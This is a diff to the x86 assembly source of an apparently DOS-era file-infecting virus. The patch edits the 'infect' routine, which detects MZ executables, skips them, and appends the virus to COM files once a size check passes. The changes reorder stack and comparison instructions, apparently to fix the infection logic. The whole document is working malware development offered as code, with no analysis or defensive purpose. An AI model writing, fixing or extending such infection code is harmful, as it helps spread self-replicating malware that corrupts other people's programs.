@@ -88,8 +88,10 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      mov dx, bp       ; Pointer to the MZ buffer
      pop bp
      int 21h          ; Calling int 21h
+     pop bx
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
      je .abort_infection
+     push bx
 
                       ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
      mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
@@ -98,8 +100,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      xor cx, cx       ; CX = 0
      xor dx, dx       ; DX = 0
      int 21h          ; Calling int 21h
-     cmp ax, 65436-virus_size   ; I the file too big??
      pop bx
+     cmp ax, 65436-virus_size   ; I the file too big??
      je .abort_infection
      push bx
                       ; Nope, perfetto sizo
